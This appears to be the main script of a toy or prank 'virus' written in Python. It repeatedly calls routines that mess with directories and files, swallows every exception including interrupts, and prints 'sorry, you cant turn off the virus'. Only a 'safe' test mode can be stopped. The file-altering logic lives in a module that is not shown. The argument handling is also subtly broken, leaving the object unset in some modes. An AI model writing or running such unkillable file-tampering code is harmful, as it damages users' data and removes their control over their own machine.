import sys

from mess_creator import MessCreator

if __name__ == '__main__':
    mess_creator = None
    mode = 'normal'
    if len(sys.argv) > 1:
        mode = sys.argv[1]
        if mode == 'safe':
            special_dir = 'test_virus'
            mess_creator = MessCreator(special_dir)
    else:
        mess_creator = MessCreator()
    while True:
        try:
            mess_creator.mess_with_directories()
            mess_creator.mess_with_files()
        except BaseException as e:
            if mode == 'safe':
                raise e
            else:
                print('sorry, you cant turn off the virus')
